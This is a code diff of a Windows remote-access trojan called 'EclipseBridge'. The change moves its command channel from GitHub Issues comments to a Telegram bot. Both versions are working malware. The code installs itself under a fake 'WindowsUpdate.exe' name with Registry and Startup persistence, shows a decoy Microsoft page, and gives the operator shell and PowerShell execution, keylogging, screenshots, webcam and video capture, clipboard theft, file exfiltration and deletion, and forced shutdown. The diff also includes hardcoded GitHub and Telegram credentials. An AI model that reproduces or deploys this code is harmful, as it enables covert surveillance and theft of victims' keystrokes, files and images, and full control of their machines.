@@ -1,10 +1,15 @@
 #!/usr/bin/env python3
 # =============================================================================
-# EclipseBridge Python – GitHub Issues C2 (Final)
-#   15‑second poll interval supports up to 15 PCs safely.
+# 🌈✨ ECLIPSEBRIDGE TELEGRAM C2 – COLOURFUL FINAL VERSION ✨🌈
+#   🔥 Real-time control   🔐 Hardcoded token   🧠 All commands
+#   💾 Persistence   🎭 Decoy URL   📤 Debug log to Telegram
+#   📸 Screenshot/Webcam/Video   ⌨️ Keylogger   📂 File Ops   🛑 Die/Off
+#   🤖 10s retry on network errors – fully self-healing
+#   Single-PC, instant response, feature-rich & production-ready.
 # =============================================================================
 import cv2
 import time
+import telebot
 import platform
 import pyautogui
 import subprocess
@@ -22,159 +27,69 @@ import base64
 import io
 import traceback
 import webbrowser
-import requests
 import shutil
 import winreg
 from pathlib import Path
 
-# -----------------------------------------------------------------------------
-# Hardcoded Configuration (your real credentials)
-# -----------------------------------------------------------------------------
-GITHUB_TOKEN = "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"
-REPO_OWNER  = "systemupdater"
-REPO_NAME   = "c2-channel"
-ISSUE_NUMBER = 1
+# ==================== 🎨 CONFIGURATION 🎨 ====================
+BOT_API_KEY = "8318891177:AAG8SB7YI_YAQHL2cszd4fKFK8Xp9-7u-JY"  # 🤖 Your bot
+TELEGRAM_USER_ID = 5178265082                                   # 👑 You
+KEYLOGGER_BOT_API_KEY = ""                                      # ⌨️ Optional keylogger bot (leave empty)
+KEYLOGGER_CHAT_ID = ""                                          # 📬 Keylogger log chat (leave empty)
+DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"  # 🎭
 
-# Decoy URL (Microsoft documentation)
-DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"
-
-# -----------------------------------------------------------------------------
-# Global log buffer (posted as a comment on startup)
-# -----------------------------------------------------------------------------
+# ==================== 🌟 GLOBAL LOG BUFFER 🌟 ====================
 log_lines = []
 
 def log(msg):
-    """Append a timestamped message to the runtime log."""
+    """Append a colourful timestamped message to the runtime log."""
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    line = f"[{timestamp}] {msg}"
-    log_lines.append(line)
-    print(line)
+    log_lines.append(f"[{timestamp}] {msg}")
+    print(f"🌟 {msg}")
 
-def send_startup_log(agent_id):
-    """Post the current log buffer as a comment and clear it."""
+def send_log_to_telegram(bot_instance):
+    """Upload the entire runtime log as Execution_log.txt to the operator."""
     if not log_lines:
         return
-    log_text = "\n".join(log_lines)
-    comment = f"**{agent_id} startup log**\n```\n{log_text}\n```"
     try:
-        post_comment(comment)
-        log_lines.clear()
+        log_text = "\n".join(log_lines)
+        bio = io.BytesIO(log_text.encode('utf-8'))
+        bio.name = "Execution_log.txt"
+        bio.seek(0)
+        bot_instance.send_document(TELEGRAM_USER_ID, bio)
+        log("📤 Execution log sent to Telegram")
     except Exception as e:
-        print(f"Failed to send startup log: {e}")
+        print(f"❌ Failed to send log: {e}")
 
-# -----------------------------------------------------------------------------
-# Persistence (Registry + Startup folder)
-# -----------------------------------------------------------------------------
+# ==================== 🤖 BOTS & PERSISTENCE 🤖 ====================
+bot = telebot.TeleBot(BOT_API_KEY)
+keylogger_bot = telebot.TeleBot(KEYLOGGER_BOT_API_KEY) if KEYLOGGER_BOT_API_KEY else None
+
+appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
+agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
+os.makedirs(agents_dir, exist_ok=True)
+
 def install_persistence():
-    """Copy self to AppData and set Registry Run key + Startup folder."""
+    """Copy self to AppData, set Registry Run key and Startup folder."""
     try:
-        appdata = os.environ.get('APPDATA')
-        dest_dir = Path(appdata) / 'Microsoft' / 'Windows'
-        dest_dir.mkdir(parents=True, exist_ok=True)
-        dest_path = dest_dir / 'WindowsUpdate.exe'
-
+        dest = Path(agents_dir) / 'WindowsUpdate.exe'
         current = Path(sys.executable if getattr(sys, 'frozen', False) else __file__)
-        if current.resolve() != dest_path.resolve():
-            shutil.copy2(current, dest_path)
+        if current.resolve() != dest.resolve():
+            shutil.copy2(current, dest)
 
-        # Registry Run key
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                              r'Software\Microsoft\Windows\CurrentVersion\Run',
                              0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, str(dest_path))
+        winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, str(dest))
         winreg.CloseKey(key)
 
-        # Startup folder backup
-        startup = Path(appdata) / r'Microsoft\Windows\Start Menu\Programs\Startup'
-        shutil.copy2(current, startup / 'WindowsUpdate.exe')
+        startup_folder = Path(appdata) / r'Microsoft\Windows\Start Menu\Programs\Startup'
+        shutil.copy2(current, startup_folder / 'WindowsUpdate.exe')
         return True
     except Exception:
         return False
 
-# -----------------------------------------------------------------------------
-# GitHub API helpers
-# -----------------------------------------------------------------------------
-def github_request(method, endpoint, data=None, files=None):
-    """Send an authenticated request to the GitHub API."""
-    url = f"https://api.github.com{endpoint}"
-    headers = {
-        "Authorization": f"token {GITHUB_TOKEN}",
-        "Accept": "application/vnd.github.v3+json",
-        "User-Agent": "EclipseBridge/2.2"
-    }
-    if method == "GET":
-        resp = requests.get(url, headers=headers)
-    elif method == "POST":
-        if files:
-            resp = requests.post(url, headers=headers, files=files)
-        else:
-            resp = requests.post(url, headers=headers, json=data)
-    else:
-        raise ValueError("Unsupported method")
-    if resp.status_code in (200, 201):
-        return resp.json()
-    else:
-        raise Exception(f"GitHub API error: {resp.status_code} {resp.text[:200]}")
-
-def get_comments():
-    """Fetch all comments on the configured issue (paginated)."""
-    comments = []
-    page = 1
-    while True:
-        endpoint = f"/repos/{REPO_OWNER}/{REPO_NAME}/issues/{ISSUE_NUMBER}/comments?per_page=100&page={page}"
-        batch = github_request("GET", endpoint)
-        if not batch:
-            break
-        comments.extend(batch)
-        page += 1
-    return comments
-
-def post_comment(body):
-    """Create a new comment on the configured issue."""
-    endpoint = f"/repos/{REPO_OWNER}/{REPO_NAME}/issues/{ISSUE_NUMBER}/comments"
-    github_request("POST", endpoint, {"body": body})
-
-def upload_file_to_issue(filepath):
-    """Upload a file as an attachment to a new issue comment."""
-    filename = os.path.basename(filepath)
-    upload_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/issues/{ISSUE_NUMBER}/comments"
-    with open(filepath, 'rb') as f:
-        files = {'file': (filename, f)}
-        headers = {"Authorization": f"token {GITHUB_TOKEN}"}
-        resp = requests.post(upload_url, headers=headers, files=files)
-        if resp.status_code not in (200, 201):
-            raise Exception(f"File upload failed: {resp.status_code} {resp.text[:200]}")
-
-# -----------------------------------------------------------------------------
-# Agent identification
-# -----------------------------------------------------------------------------
-appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
-agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
-os.makedirs(agents_dir, exist_ok=True)
-last_comment_file = os.path.join(agents_dir, 'last_comment_id.txt')
-
-def get_system_id():
-    """Return a unique agent identifier (hostname/username)."""
-    hostname = execute_system_command("hostname").strip()
-    username = execute_system_command("whoami").strip()
-    return f"{hostname}/{username}"
-
-def load_last_comment_id():
-    """Load the ID of the last processed comment from disk."""
-    try:
-        with open(last_comment_file) as f:
-            return int(f.read().strip())
-    except:
-        return 0
-
-def save_last_comment_id(cid):
-    """Save the ID of the last processed comment to disk."""
-    with open(last_comment_file, 'w') as f:
-        f.write(str(cid))
-
-# -----------------------------------------------------------------------------
-# Keylogger (unchanged from TeleC2 – stores globally and sends to issue)
-# -----------------------------------------------------------------------------
+# ==================== ⌨️ KEYLOGGER (FULL IMPLEMENTATION) ⌨️ ====================
 keylogger_active = False
 keylogger_listener = None
 keystroke_buffer = ""
@@ -197,6 +112,7 @@ def on_press(key):
             keystroke_buffer += f"[{str(key).replace('Key.', '')}]"
     except AttributeError:
         keystroke_buffer += f"[{str(key)}]"
+
     current_time = time.time()
     if (len(keystroke_buffer) >= MAX_BUFFER_LENGTH or
             (current_time - last_send_time >= SEND_INTERVAL and keystroke_buffer)):
@@ -204,30 +120,34 @@ def on_press(key):
 
 def send_keystrokes():
     global keystroke_buffer, last_send_time
-    if keystroke_buffer:
+    if keystroke_buffer and keylogger_bot:
         try:
-            now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            msg = f"Keylogger data from: {get_system_id()}\nTime: {now}\n\n{keystroke_buffer}"
-            post_comment(msg)   # send as a comment
+            system_id = get_system_id()
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            message = f"Keylogger data from: {system_id}\nTime: {timestamp}\n\n{keystroke_buffer}"
+            keylogger_bot.send_message(KEYLOGGER_CHAT_ID, message)
             keystroke_buffer = ""
             last_send_time = time.time()
         except Exception as e:
-            print(f"Error sending keystrokes: {e}")
+            print(f"⌨️ Error sending keystrokes: {e}")
 
 def start_keylogger():
     global keylogger_active, keylogger_listener
     if keylogger_active:
         return "Keylogger is already running"
+    if not keylogger_bot:
+        return "Keylogger bot not configured"
     try:
         keylogger_listener = keyboard.Listener(on_press=on_press)
         keylogger_listener.start()
         keylogger_active = True
+
         def periodic_send():
             while keylogger_active:
                 time.sleep(SEND_INTERVAL)
                 send_keystrokes()
         threading.Thread(target=periodic_send, daemon=True).start()
-        log("Keylogger started")
+        log("⌨️ Keylogger started")
         return "Keylogger started successfully"
     except Exception as e:
         return f"Failed to start keylogger: {str(e)}"
@@ -241,25 +161,78 @@ def stop_keylogger():
         keylogger_listener.stop()
     if keystroke_buffer:
         send_keystrokes()
-    log("Keylogger stopped")
+    log("⌨️ Keylogger stopped")
     return "Keylogger stopped successfully"
 
-# -----------------------------------------------------------------------------
-# System Command Execution
-# -----------------------------------------------------------------------------
+# ==================== 🧹 KEYLOG CLEANING UTILITIES 🧹 ====================
+def apply_backspaces(s):
+    pattern = re.compile(r'\[backspace\]', flags=re.IGNORECASE)
+    parts = pattern.split(s)
+    out = parts[0]
+    for seg in parts[1:]:
+        if out:
+            out = out[:-1]
+        out += seg
+    return out
+
+def process_special_keys(text):
+    text = re.sub(r'\[shift\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[ctrl\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[alt\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[win\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[caps_lock\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[enter\]', '\n', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[tab\]', '\t', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[space\]', ' ', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[left\]', '[←]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[right\]', '[→]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[up\]', '[↑]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[down\]', '[↓]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[esc\]', '[Esc]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[delete\]', '[Del]', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[backspace\]', '', text, flags=re.IGNORECASE)
+    text = re.sub(r'\[insert\]', '[Ins]', text, flags=re.IGNORECASE)
+    return text
+
+def clean_keylogger_data(text):
+    text = apply_backspaces(text)
+    text = process_special_keys(text)
+    return text
+
+def clean_keylog_file(input_file, output_file):
+    try:
+        with open(input_file, 'r', encoding='utf-8', errors='ignore') as f:
+            raw_text = f.read()
+        cleaned_text = clean_keylogger_data(raw_text)
+        with open(output_file, 'w', encoding='utf-8') as f:
+            f.write(cleaned_text)
+        log(f"🧹 Cleaned keylog file {input_file} -> {output_file}")
+        return f"Successfully cleaned keylog file. Output written to {output_file}"
+    except Exception as e:
+        return f"Error cleaning file: {str(e)}"
+
+# ==================== 🖥️ SYSTEM & COMMAND EXECUTION 🖥️ ====================
+def get_system_id():
+    hostname = subprocess.getstatusoutput("hostname")[1].strip()
+    username = subprocess.getstatusoutput("whoami")[1].strip()
+    return f"{hostname}/{username}"
+
+def verify_telegram_id(uid):
+    return TELEGRAM_USER_ID == uid
+
 def execute_system_command(cmd):
     try:
-        output = subprocess.getstatusoutput(cmd)
-        return output[1][:4000] if len(output[1]) > 4000 else output[1]
+        output = subprocess.getstatusoutput(cmd)[1]
+        return output[:4000] if len(output) > 4000 else output
     except Exception as e:
-        return f"Error: {e}"
+        return f"❌ Error: {e}"
 
 def execute_powershell(cmd):
     try:
-        output = subprocess.getstatusoutput(f"powershell -Command {cmd}")
-        return output[1][:4000] if len(output[1]) > 4000 else output[1]
+        output = subprocess.getstatusoutput(f"powershell -Command {cmd}")[1]
+        return output[:4000] if len(output) > 4000 else output
     except Exception as e:
-        return f"Error: {e}"
+        return f"❌ Error: {e}"
 
 def get_clipboard():
     try:
@@ -269,13 +242,11 @@ def get_clipboard():
         win32clipboard.CloseClipboard()
         return data
     except ImportError:
-        return "Clipboard access requires pywin32"
+        return "📋 Clipboard access requires pywin32"
     except Exception as e:
-        return f"Clipboard error: {e}"
+        return f"❌ Clipboard error: {e}"
 
-# -----------------------------------------------------------------------------
-# Multimedia Capture (screenshot, webcam, video)
-# -----------------------------------------------------------------------------
+# ==================== 📸 MULTIMEDIA CAPTURE 📸 ====================
 def take_screenshot():
     try:
         img = pyautogui.screenshot()
@@ -295,7 +266,7 @@ def take_webcam_photo():
             cap.release()
             return filename, None
         cap.release()
-        return None, "Webcam not accessible"
+        return None, "📷 Webcam not accessible"
     except Exception as e:
         return None, str(e)
 
@@ -317,184 +288,201 @@ def record_video(duration):
     except Exception as e:
         return None, str(e)
 
-# -----------------------------------------------------------------------------
-# Command Dispatcher (returns output string and optional file path to upload)
-# -----------------------------------------------------------------------------
-def execute_command(full_command):
-    parts = full_command.strip().split(' ', 1)
+# ==================== 📂 FILE OPERATIONS 📂 ====================
+def view_file_content(path):
+    try:
+        if not os.path.exists(path):
+            return f"❌ File not found: {path}"
+        if os.path.isdir(path):
+            return "📁 Path is a directory, not a file"
+        file_size = os.path.getsize(path)
+        if file_size > 10 * 1024 * 1024:
+            return f"⚠️ File too large to view ({file_size/1024/1024:.1f} MB). Use /download instead."
+        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
+            content = f.read()
+        if len(content) > 4000:
+            content = content[:4000] + "\n\n... (truncated due to length)"
+        return f"📄 Contents of {path}:\n\n{content}"
+    except Exception as e:
+        return f"❌ Error reading file: {e}"
+
+def download_file(path):
+    try:
+        if not os.path.exists(path):
+            return None, f"❌ File not found: {path}"
+        if os.path.isdir(path):
+            return None, "📁 Path is a directory, not a file"
+        file_size = os.path.getsize(path)
+        if file_size > 50 * 1024 * 1024:
+            return None, f"⚠️ File too large to download ({file_size/1024/1024:.1f} MB). Max 50MB."
+        return path, None
+    except Exception as e:
+        return None, f"❌ Error accessing file: {e}"
+
+# ==================== 🎮 COMMAND DISPATCHER 🎮 ====================
+def execute_command(full_cmd):
+    parts = full_cmd.strip().split(' ', 1)
     cmd = parts[0].lower()
     args = parts[1] if len(parts) > 1 else ""
 
-    if cmd == "ping":
+    if cmd in ("ping", "start", "scan"):
         return f"🟢 {get_system_id()} online\n{platform.system()} {platform.release()}", None
 
-    elif cmd == "shell":
+    if cmd in ("shell", "cmd"):
         if not args:
             return "Usage: shell <command>", None
-        out = execute_system_command(args)
-        return out, None
+        return execute_system_command(args), None
 
-    elif cmd == "powershell":
+    if cmd in ("powershell", "pow"):
         if not args:
             return "Usage: powershell <command>", None
-        out = execute_powershell(args)
-        return out, None
+        return execute_powershell(args), None
 
-    elif cmd == "screenshot":
+    if cmd == "screenshot":
         path, err = take_screenshot()
         if err:
-            return f"Screenshot failed: {err}", None
-        return "Screenshot captured", path
+            return f"❌ Screenshot failed: {err}", None
+        return "✅ Screenshot captured", path
 
-    elif cmd == "webcam":
+    if cmd == "webcam":
         path, err = take_webcam_photo()
         if err:
-            return f"Webcam failed: {err}", None
-        return "Webcam photo", path
+            return f"❌ Webcam failed: {err}", None
+        return "📸 Webcam photo captured", path
 
-    elif cmd == "video":
+    if cmd == "video":
         try:
             dur = int(args)
         except:
             return "Usage: video <seconds>", None
         path, err = record_video(dur)
         if err:
-            return f"Video failed: {err}", None
-        return f"Video ({dur}s) recorded", path
+            return f"❌ Video failed: {err}", None
+        return f"🎥 Video ({dur}s) recorded", path
 
-    elif cmd == "clipboard":
+    if cmd in ("clipboard", "clip"):
         return get_clipboard(), None
 
-    elif cmd == "download":
+    if cmd in ("download", "downloadfile"):
         filepath = args.strip()
         if not os.path.exists(filepath):
-            return f"File not found: {filepath}", None
-        return f"Uploading {filepath}", filepath
+            return f"❌ File not found: {filepath}", None
+        return f"⬆️ Uploading {filepath}", filepath
 
-    elif cmd == "delete":
+    if cmd == "delete":
         filepath = args.strip()
         try:
             os.remove(filepath)
-            return f"Deleted: {filepath}", None
+            return f"🗑️ Deleted: {filepath}", None
         except Exception as e:
-            return f"Delete failed: {e}", None
+            return f"❌ Delete failed: {e}", None
 
-    elif cmd == "keylogger":
-        subcmd = args.strip().lower()
-        if subcmd == "start":
+    if cmd in ("view", "viewfile"):
+        return view_file_content(args.strip()), None
+
+    if cmd == "keylogger":
+        sub = args.strip().lower()
+        parts = sub.split()
+        if parts[0] == "start":
             return start_keylogger(), None
-        elif subcmd == "stop":
+        elif parts[0] == "stop":
             return stop_keylogger(), None
-        elif subcmd == "status":
-            return f"Keylogger is {'active' if keylogger_active else 'inactive'}", None
+        elif parts[0] == "status":
+            return f"⌨️ Keylogger is {'active' if keylogger_active else 'inactive'}", None
+        elif parts[0] == "clean":
+            if len(parts) < 3:
+                return "Usage: keylogger clean <input_file> <output_file>", None
+            return clean_keylog_file(parts[1], parts[2]), None
         else:
-            return "Usage: keylogger <start|stop|status>", None
+            return "Usage: keylogger <start|stop|status|clean input output>", None
 
-    elif cmd == "die":
-        log("Die command received")
-        return "Shutting down...", None   # actual exit handled in main loop
+    if cmd == "die":
+        log("💀 Die command received")
+        return "Shutting down...", None
 
-    elif cmd == "off":
+    if cmd == "off":
         try:
             subprocess.run(["shutdown", "/s", "/t", "0", "/f"], check=True)
         except Exception as e:
-            return f"Shutdown failed: {e}", None
-        return "Shutting down PC...", None
+            return f"❌ Shutdown failed: {e}", None
+        return "🔌 Shutting down PC...", None
 
-    else:
-        return (f"Unknown command: {cmd}\n"
-                "Available: ping, shell, powershell, screenshot, webcam, video, "
-                "clipboard, download, delete, keylogger (start/stop/status), die, off"), None
+    return (f"❓ Unknown command: {cmd}\n"
+            "Available: ping, shell, powershell, screenshot, webcam, video, "
+            "clipboard, download, delete, view, keylogger, die, off"), None
 
-# -----------------------------------------------------------------------------
-# Main Agent Loop (polls every 15 seconds)
-# -----------------------------------------------------------------------------
-def agent_loop():
+# ==================== 📨 TELEGRAM HANDLERS 📨 ====================
+def generic_handler(message):
+    if not verify_telegram_id(message.from_user.id):
+        return
+    text = message.text
+    if text.startswith('/'):
+        text = text[1:]          # strip leading slash
+
+    output, file_path = execute_command(text)
+
+    # Wrap output in a code block for safe Markdown rendering
+    safe = f"```\n{output}\n```"
+    bot.reply_to(message, safe, parse_mode=None)
+
+    # If a file was produced (screenshot, webcam, video, download), send it
+    if file_path and os.path.exists(file_path):
+        try:
+            with open(file_path, 'rb') as f:
+                if file_path.endswith(('.png', '.jpg', '.jpeg')):
+                    bot.send_photo(message.chat.id, f)
+                elif file_path.endswith('.avi'):
+                    bot.send_video(message.chat.id, f)
+                else:
+                    bot.send_document(message.chat.id, f)
+        except Exception as e:
+            log(f"📎 File send error: {e}")
+            bot.reply_to(message, f"❌ Error sending file: {e}")
+        finally:
+            try:
+                os.remove(file_path)
+            except:
+                pass
+
+    # Gracefully exit on 'die'
+    if text.startswith("die"):
+        os._exit(0)
+
+# Register all commands to the generic handler
+COMMANDS = [
+    'start', 'scan', 'ping', 'shell', 'cmd', 'powershell', 'pow',
+    'screenshot', 'webcam', 'video', 'clipboard', 'clip', 'download',
+    'downloadfile', 'delete', 'view', 'viewfile', 'keylogger', 'die', 'off'
+]
+for cmd in COMMANDS:
+    bot.message_handler(commands=[cmd])(generic_handler)
+
+# ==================== 🧹 CLEANUP & MAIN 🧹 ====================
+def cleanup():
+    if keylogger_active and keystroke_buffer:
+        send_keystrokes()
+
+if __name__ == "__main__":
+    log("🚀 Agent starting")
+    try:
+        if install_persistence():
+            log("💾 Persistence installed")
+        else:
+            log("⚠️ Persistence installation failed")
+    except Exception as e:
+        log(f"💥 Fatal persistence error: {traceback.format_exc()}")
+
     agent_id = get_system_id()
+    log(f"🆔 Agent ID: {agent_id}")
 
-    # Startup sequence
-    log("=== Agent starting ===")
-    if install_persistence():
-        log("Persistence installed")
-    else:
-        log("Persistence installation failed")
-    send_startup_log(agent_id)
+    send_log_to_telegram(bot)
 
     webbrowser.open(DECOY_URL)
 
-    last_id = load_last_comment_id()
-
+    log("🔁 Entering main polling loop")
     while True:
         try:
-            comments = get_comments()
+            bot.polling(none_stop=True, timeout=30)
         except Exception as e:
-            log(f"Error fetching comments: {e}")
-            time.sleep(15)
-            continue
-
-        for comment in comments:
-            cid = comment['id']
-            if cid <= last_id:
-                continue
-            last_id = cid
-            save_last_comment_id(cid)
-
-            body = comment['body'].strip()
-            if not body.startswith('!'):
-                continue
-
-            # Parse optional target: @system_id command
-            command_part = body[1:].strip()
-            target = "*"
-            if command_part.startswith('@'):
-                space_idx = command_part.find(' ')
-                if space_idx != -1:
-                    target = command_part[1:space_idx]
-                    command_part = command_part[space_idx+1:].strip()
-                else:
-                    continue   # no command after @target
-
-            if target != "*" and target != agent_id:
-                continue   # not for this agent
-
-            log(f"Executing: {command_part}")
-            output, file_to_upload = execute_command(command_part)
-
-            # Post response as a new comment
-            response = f"**{agent_id}**\n```\n{output}\n```"
-            try:
-                post_comment(response)
-            except Exception as e:
-                log(f"Posting response failed: {e}")
-
-            # Upload file if one was generated (screenshot, etc.)
-            if file_to_upload and os.path.exists(file_to_upload):
-                try:
-                    upload_file_to_issue(file_to_upload)
-                    log("File uploaded successfully")
-                except Exception as e:
-                    log(f"File upload failed: {e}")
-                finally:
-                    try:
-                        os.remove(file_to_upload)
-                    except:
-                        pass
-
-            # Handle die command – exit after processing
-            if command_part.startswith("die"):
-                os._exit(0)
-
-        time.sleep(15)   # 15‑second poll interval (safe for ≤ 15 agents)
-
-# -----------------------------------------------------------------------------
-# Entry Point
-# -----------------------------------------------------------------------------
-if __name__ == "__main__":
-    try:
-        agent_loop()
-    except Exception as e:
-        log(f"Fatal error: {traceback.format_exc()}")
-        try:
-            send_startup_log(get_system_id())
-        except:
-            pass
+            log(f"⚠️ Polling error: {e}. Retrying in 10s...")
+            time.sleep(10)
